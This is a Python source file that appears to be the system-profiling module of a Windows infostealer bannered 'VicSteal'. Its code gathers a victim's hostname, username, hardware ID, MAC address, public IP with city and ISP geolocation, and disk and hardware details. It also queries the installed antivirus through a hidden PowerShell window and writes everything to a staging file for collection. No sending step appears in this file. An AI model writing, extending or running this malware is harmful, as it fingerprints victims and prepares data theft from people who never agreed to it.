import psutil
import platform
import requests
import wmi
import sys
import os
import socket
import win32api
import subprocess
import ctypes
from datetime import datetime
from getpass import getuser


SYSINFO = [r"""
*******************************************
*                                         *
* __      ___       _____ _             _  *
* \ \    / (_)     / ____| |           | | *
*  \ \  / / _  ___| (___ | |_ ___  __ _| | *
*   \ \/ / | |/ __|\___ \| __/ _ \/ _` | | *
*    \  /  | | (__ ____) | ||  __/ (_| | | *
*     \/   |_|\___|_____/ \__\___|\__,_|_| *
*                                          *
*                                          *
*******************************************
"""]


def getOS(kingFolder: str) -> None:
    import os
    try:
        vic_run_path: str = os.path.abspath(sys.argv[0])
        SYSINFO.append(f"Vic-Run Path: {vic_run_path}")
    except:
        pass
    
    try:
        hostname: str = socket.gethostname() #os.getenv('HOSTNAME')
        username: str = getuser()
        SYSINFO.append(f'Hostname: {hostname}\nUsername: {username}')
    except:
        pass
    
    try:
        hwid: str = subprocess.getoutput('powershell "(Get-CimInstance Win32_ComputerSystemProduct).UUID"')
        SYSINFO.append(f'Hwid: {hwid}')
    except:
        pass

    # extact systeam lang
    try:
        kernel32 = ctypes.windll.kernel32 # get lang id type is int

        lang_id: int = kernel32.GetUserDefaultUILanguage()
        buf = ctypes.create_unicode_buffer(85)
        kernel32.LCIDToLocaleName(lang_id, buf, 85, 0)
        
        SYSINFO.append(f'Language: {buf.value}') #change id to lang example ('en_UK')
    except:
        pass
    
    try:
        seconds = ctypes.windll.kernel32.GetTickCount64() // 1000

        days, seconds = divmod(seconds, 86400)
        hours, seconds = divmod(seconds, 3600)
        minutes, _ = divmod(seconds, 60)

        SYSINFO.append(f"Uptime: {days}d {hours}h {minutes}m")
    except:
        pass
    
    try:
        
        r = requests.get("http://ip-api.com/json", headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"}, timeout=1).json()
        if r:
            SYSINFO.append(f'Public IP: {r["query"]}\nCountry: {r["country"]}\nRegion: {r["regionName"]}\nCity: {r["city"]}\nZIP: {r["zip"]}\nISP: {r["isp"]}')
    except (requests.exceptions.ConnectionError, requests.exceptions.Timeout, requests.exceptions.RequestException):
        pass
    
    try:
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)

        SYSINFO.append(f"Local IP: {local_ip}")
    except:
        pass
    
    try:
        import uuid

        mac = uuid.getnode()

        mac_address = ":".join(
            f"{(mac >> i) & 0xff:02x}"
            for i in range(40, -1, -8)
        )

        SYSINFO.append(f"MAC ADDRESS: {mac_address}")
    except:
        pass
    
    try:
        os: str = platform.system()
        SYSINFO.append(f'Os: {os}')
    except:
        pass

    try:
        strac: str = platform.machine()
        SYSINFO.append(f"Machine: {strac}")
    except:
        pass
    
    try:
        osInfo: str = platform.platform()  
        SYSINFO.append(f'System Version: {osInfo}')
    except:
        pass
    
    try:
        result = subprocess.run(
        [
            "powershell",
            "-command",
            '(Get-WmiObject -Namespace "root\\SecurityCenter2" -Class AntiVirusProduct).displayName'
        ],
            capture_output=True,
            text=True,
            creationflags=subprocess.CREATE_NO_WINDOW
        )

        if result:
            SYSINFO.append(f"Anti-Virus: {result.stdout.strip()}")
    except:
        pass

    try:
        widsh = win32api.GetSystemMetrics(0)
        height = win32api.GetSystemMetrics(1)
        SYSINFO.append(f"Screen Dimensions: {widsh}x{height}")
    except:
        pass
    
    try:
        cpu: str = wmi.WMI().Win32_Processor()[0].Name
        gpu: str = wmi.WMI().Win32_VideoController()[0].Name
        
        SYSINFO.append(f"CPU: {cpu}\nGPU: {gpu}")
    except:
        pass

    try:
        ram: float = round(float(wmi.WMI().Win32_OperatingSystem()[0].TotalVisibleMemorySize) / 1048576, 0)
        SYSINFO.append(f'RAM: {ram} GB')
    except:
        pass
    
    try:
        disk: str = ("{:<9} "*4).format("Drive", "Free", "Total", "Usage") + "\n"
        for part in psutil.disk_partitions(all=False):
           
            if 'cdrom' in part.opts or part.fstype == '':
                continue
            usage = psutil.disk_usage(part.mountpoint)
            disk += ("{:<9} "*4).format(part.device, str(usage.free // (2**30)) + "GB", str(usage.total // (2**30)) + "GB", str(usage.percent) + "%") + "\n"
        SYSINFO.append(disk)
    except:
        pass
    
    SYSINFO.append(f"""Log Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}""")
    
    if SYSINFO:
        with open(f"{kingFolder}\\System Info.txt", 'w', encoding='utf-8', errors='ignore') as file_data:
            file_data.write(f"\n".join(str(x) for x in SYSINFO))